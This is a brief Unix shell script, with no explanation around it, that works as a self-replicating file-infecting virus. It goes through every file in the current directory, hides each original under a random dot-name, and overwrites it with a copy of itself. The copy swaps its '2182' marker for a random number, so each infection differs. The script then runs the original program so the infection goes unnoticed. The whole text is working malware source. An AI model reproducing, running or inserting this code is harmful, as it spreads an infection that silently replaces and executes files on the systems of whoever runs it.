for i in *	#2182
do		#2182
r2182=$$`random 255`
if test 2182$i != 2182$0
	then	#2182
	mv $i .$r2182
	cat $0 | sed "s/2182/$r2182/g" > $i;chmod 700 $i
fi		#2182
done		#2182
mv $0 .z2182
mv .2182 $0
$0 $*	#2182
mv $0 .2182
mv .z2182 $0
